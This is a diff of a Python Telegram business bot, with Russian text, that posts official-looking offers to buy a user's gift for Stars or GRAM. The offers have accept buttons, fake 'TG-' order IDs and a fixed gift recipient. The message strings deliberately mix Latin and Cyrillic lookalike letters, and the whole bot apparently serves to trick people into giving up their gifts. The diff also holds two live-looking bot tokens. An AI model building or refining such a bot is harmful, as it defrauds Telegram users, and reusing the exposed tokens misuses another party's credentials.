@@ -16,9 +16,10 @@ from aiogram.enums import ParseMode
 # ============================================================
 # КОНФИГУРАЦИЯ
 # ============================================================
-BOT_TOKEN = "8960916793:AAGtrjgqtsPM22Lv8icNp95SAPSQNoUwq-4"
+BOT_TOKEN = "8960916793:AAEqlvxSOro5sEkVlK9282B5Fjmg4eGYzyE"
 
-STAR_EMOJI_ID = "5954135079662916434"
+STAR_EMOJI_ID = "5848259999763011021"
+GRAM_EMOJI_ID = "5303250111852228815"
 EMOJI_ACCEPT = "5774022692642492953"
 EMOJI_DECLINE = "5774077015388852135"
 GIFT_RECIPIENT = "giddaniel"
@@ -37,6 +38,11 @@ offers: dict[str, dict] = {}
 def format_gift_name(slug: str, number: str) -> str:
     formatted_slug = re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
     return f"{formatted_slug} #{number}"
+
+def currency_parts(currency: str):
+    if currency == "gram":
+        return f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">🪙</tg-emoji>', "GRАM"
+    return f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>', "Stаrs"
 
 async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
     try:
@@ -66,7 +72,7 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
 async def handle_business_connection(connection: BusinessConnection) -> None:
     pass
 
-@dp.business_message(F.text.regexp(r"^qwe\s"))
+@dp.business_message(F.text.regexp(r"^go\s"))
 async def handle_offer(message: Message) -> None:
     if not message.business_connection_id:
         return
@@ -75,7 +81,7 @@ async def handle_offer(message: Message) -> None:
     sender_name = message.from_user.full_name if message.from_user else "Unknown"
 
     parts = message.text.strip().split()
-    # qwe <link> <amount> <currency>
+    # go <link> <amount> <currency>
     if len(parts) < 3:
         return
 
@@ -105,18 +111,11 @@ async def handle_offer(message: Message) -> None:
     gift_name = format_gift_name(slug, number)
     gift_display = f'<a href="{full_link}"><b>{gift_name}</b></a>'
     amount_fmt = f"{int(amount):,}"
-
-    if currency == "gram":
-        emoji_tag = '<tg-emoji emoji-id="5267445215773367585">🪙</tg-emoji>'
-        cur_title = "GRАM"
-    else:
-        emoji_tag = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
-        cur_title = "Stаrs"
+    emoji_tag, cur_title = currency_parts(currency)
 
     text = (
-        f"Пoльзoвaтeль <b>{sender_name}</b> пpeдлaгaeт вaм за "
-        f"{gift_display} зa <b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b>.\n\n"
-        f"Пpeдлoжeние дeйcтвyeт eщё 12ч. 0 мин."
+        f"Пoльзoвaтeль <b>{sender_name}</b> пpeдлaгaeт Вaм "
+        f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> зa пoдapoк {gift_display}"
     )
 
     offer_id = uuid.uuid4().hex[:12]
@@ -178,13 +177,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
 
     amount_fmt = f"{int(data['amount']):,}"
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]}</b></a>'
-
-    if data["currency"] == "gram":
-        emoji_tag = '<tg-emoji emoji-id="5267445215773367585">🪙</tg-emoji>'
-        cur_u = "GRАM"
-    else:
-        emoji_tag = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
-        cur_u = "Stаrs"
+    emoji_tag, cur_u = currency_parts(data["currency"])
 
     order_id = f"ТG-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
 
